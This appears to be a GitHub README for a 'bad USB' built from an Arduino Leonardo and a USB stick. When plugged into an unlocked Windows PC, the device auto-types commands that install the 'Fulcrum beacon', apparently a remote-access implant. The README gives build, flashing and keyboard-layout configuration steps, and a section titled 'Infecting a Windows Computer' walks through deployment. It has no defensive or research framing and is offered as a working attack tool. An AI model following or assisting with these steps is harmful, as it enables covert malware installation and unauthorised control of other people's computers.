# Fulcrum-Bad-Usb-Installer

The Fulcrum-Bad-Usb-Installer is a device built using an Arduino Leonardo, a USB stick, and a USB splitter. It is used to install the Fulcrum beacon simply by plugging it into a USB slot on a Windows computer. Acting as a "bad USB," the device runs a new installer file `local_installer.py` from the USB stick, which installs the Fulcrum beacon without needing an internet connection.

## Setup

1. **Initial Setup**  
   Follow the setup guide from the original [Fulcrum repository](https://github.com/MaximDieball/Fulcrum).

2. **USB Stick Preparation**  
   - Place the `.env` file onto your USB stick.
   - Copy the Fulcrum beacon file to the USB stick.
     - You can rename the beacon file if needed.
     - With this version of the Fulcrum beacon, you can use a compiled version without requiring Discord Nitro, because the file will be moved locally.

3. **Arduino Leonardo Setup**
   - Download and install the [Arduino IDE](https://www.arduino.cc/en/software).
   - Open one of the Arduino scripts from this repository:
     - The `arduino_leonardo_script/arduino_leonardo_script.ino` script works with an English keyboard layout (not yet tested).
     - The `arduino_leonardo_script_GERMAN_KEYBOARD_WORKAROUND/arduino_leonardo_script_GERMAN_KEYBOARD_WORKAROUND.ino` script is designed for a German keyboard layout.
   - For the new installer to work on every system, you need to use a compiled version of `local_installer.py`. **[RECOMMENDED]**
     - If you use a compiled version of `local_installer.py`, you need to change the Arduino script from `const String INSTALLER = "local_installer.py";` to `const String INSTALLER = "local?installer.exe";`.
       - Please check this value. It could be changed in the current version of the repo **[RECOMMENDED]**
       - remember to replace ``py`` with ``pz`` and ``local_installer`` with ``local?installer`` when using the German keyboard layout
   - Upload the selected script to the Arduino Leonardo.

## Assembling the Device

1. Connect the Arduino Leonardo to the USB splitter using a micro USB to USB-A cable.
2. Connect the USB stick to the USB splitter.

![bad usb (2)](https://github.com/user-attachments/assets/b9c6987a-3635-4026-bb79-ad12223792f8)

## Infecting a Windows Computer

1. Plug the device into an unlocked Windows computer and wait for the script to run. The CMD window will automatically close when the process is complete.
2. You can now disconnect the device.
3. Refer to the [original Fulcrum](https://github.com/MaximDieball/Fulcrum) repository for instructions on what to do next.
